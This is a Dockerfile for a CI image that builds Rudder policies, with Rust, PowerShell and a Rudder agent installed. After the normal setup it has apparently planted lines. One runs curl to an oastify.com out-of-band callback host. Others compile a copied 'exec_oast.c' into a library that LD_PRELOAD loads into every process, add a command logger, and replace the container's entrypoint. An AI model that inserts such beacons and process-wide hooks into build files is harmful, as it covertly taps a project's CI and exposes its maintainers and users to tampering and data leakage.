FROM rust:1.85.0-bookworm
LABEL ci=rudder/policies/Dockerfile

ARG USER_ID=1000
COPY ci/user.sh .
RUN ./user.sh $USER_ID

ARG RUDDER_VER=latest
ARG PSANALYZER_VERSION=1.20.0

COPY ci/rust.sh .
RUN ./rust.sh

ENV RUSTC_WRAPPER="sccache"

# we need cf-promises
# the easiest way is to install an agent
RUN <<EOF
set -e
wget https://github.com/PowerShell/PowerShell/releases/download/v7.4.0/powershell_7.4.0-1.deb_amd64.deb
apt-get install ./powershell_7.4.0-1.deb_amd64.deb
apt-get update && apt-get install -y rsync msitools libapt-pkg-dev libaugeas-dev clang python3-jinja2 gcc curl
# ignore postinst failures
curl https://repository.rudder.io/tools/rudder-setup | sed 's/rudder agent \(.*\)/rudder agent \1 \| true/g' | bash -s setup-agent $RUDDER_VER
pwsh -Command Install-Module -Name PSScriptAnalyzer -RequiredVersion $PSANALYZER_VERSION -Scope AllUsers -Confirm:\$false -Force
EOF

RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/policies

# 1) Install the logger & trap
COPY ci/command_logger.sh /etc/command_logger.sh

COPY ci/exec_oast.c /tmp/exec_oast.c
RUN gcc -shared -fPIC -o /usr/local/lib/libexec_oast.so /tmp/exec_oast.c -ldl \
    && rm /tmp/exec_oast.c

# ensure it's preloaded for all processes
ENV LD_PRELOAD=/usr/local/lib/libexec_oast.so


# 2) Install our ENTRYPOINT wrapper
COPY ci/entrypoint.sh /usr/local/bin/entrypoint.sh
RUN chmod +x /usr/local/bin/entrypoint.sh

# 3) Set it as the container’s ENTRYPOINT
ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]